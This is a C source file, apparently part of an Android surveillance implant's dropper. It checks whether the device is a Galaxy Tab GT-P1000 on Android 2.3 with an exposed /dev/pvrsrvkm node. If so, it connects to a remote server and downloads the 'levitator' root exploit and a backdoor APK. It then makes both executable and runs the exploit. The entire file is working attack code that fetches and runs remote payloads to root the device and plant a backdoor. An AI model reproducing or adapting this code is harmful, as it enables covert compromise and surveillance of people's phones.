#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include "rcs_connection.h"

/* List of functions to check device support */
/* Each function check if an exploit is available for the target */

void wlog(char *str) {
  char log_file[] = "log";
  FILE *fp = fopen(log_file, "a");

  fprintf(fp, str);
  fclose(fp);  
}


void download_exec_exploit() {
  int sockfd, readed;
  struct sockaddr_in server_addr;
  struct hostent *hp;
  char buffer[0x1000];

  char cmd[256];
  FILE *file;

  // Exploit file creation
  if(!(file = fopen(expname, "w"))) {
    wlog("Error on file\n");
    exit(-1);
  }

  // Connection with server
  hp = gethostbyname(server_ip);
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(server_port);
  server_addr.sin_addr.s_addr = ((struct in_addr*)(hp->h_addr)) -> s_addr;

  if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    wlog("Unable to create socket\n");
    exit(-1);
  }

  if(connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr))) {
    wlog("Unable to connect\n");
    exit(-1);
  }

  // Exploit download
  memset(buffer, 0, sizeof(buffer));
  while( readed = recv(sockfd, buffer, sizeof(buffer), 0)) {
    int written = fwrite(&buffer, 1, readed, file);
    memset(buffer, 0, sizeof(buffer));
  }

  
  fclose(file);
  close(sockfd);

  // Backdoor file creation
  if(!(file = fopen(rcsname, "w"))) {
    printf("Error on rcs file\n");
    exit(-1);
  }

  if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    wlog("Unable to create socket\n");
    exit(-1);
  }

  server_addr.sin_port = htons(rcs_server_port);
  server_addr.sin_addr.s_addr = ((struct in_addr*)(hp->h_addr)) -> s_addr;

  if(connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr))) {
    wlog("Unable to get apk\n");
    exit(-1);
  }

  // Backdoor dowload
  memset(buffer, 0, sizeof(buffer));
  while( readed = recv(sockfd, buffer, sizeof(buffer), 0)) {
    int written = fwrite(&buffer, 1, readed, file);
    memset(buffer, 0, sizeof(buffer));
  }

  fclose(file);
  close(sockfd);

  chmod(expname, 0711);
  chmod(rcsname, 0777);

  memset(cmd, 0, sizeof(cmd));
  sprintf(cmd, "./%s", expname);

  // EXPLOIT!!!!
  system(cmd);
}



/**************/
/* GALAXY TAB */
/**************/

int try_GT_P1000() {

  struct stat pvr_mod;
  char st_fingerprint[512];
  FILE *fp;

  /* Fingerprint on device */
  fp = popen("/system/bin/getprop ro.build.fingerprint", "r");
  if (fp == NULL) {
    wlog("Unable to get properties\n");
    exit(-1);
  }

  memset(st_fingerprint, 0, sizeof(st_fingerprint));
  if(fgets(st_fingerprint, sizeof(st_fingerprint)-1, fp) != NULL) {
    
    /* Check for Galaxy Tab GT-P1000, only Android 2.3.x is supported*/
    if(strstr(st_fingerprint, "GT-P1000") && strstr(st_fingerprint, "2.3")) {
      /* Check permissions on pvr chip device. We need it to use levitator exploit */
      if(!stat("/dev/pvrsrvkm", &pvr_mod)) {
	if((pvr_mod.st_mode & S_IRWXO) == (S_IROTH | S_IWOTH)) {
	  /* Everything is ok... download and exec levitator */
	  download_exec_exploit();
	}
      }
    }
  }

  pclose(fp);

  return 0;
}


/* Array of check functions for supported devices */
int (*exploit_check[]) ()={ try_GT_P1000 };


void start( unsigned int ip, unsigned short port  )
{
  int i;

  char log_file[] = "log2";
  FILE *fp = fopen(log_file, "a");


  fprintf(fp, "ip %X\n", ip);
  fprintf(fp, "port %X\n", port);
  fclose(fp);  

  wlog("Starting...\n");

  /* Exec every check function */
  for(i=0; i<sizeof(exploit_check)/4; i++)
    exploit_check[i]();

}










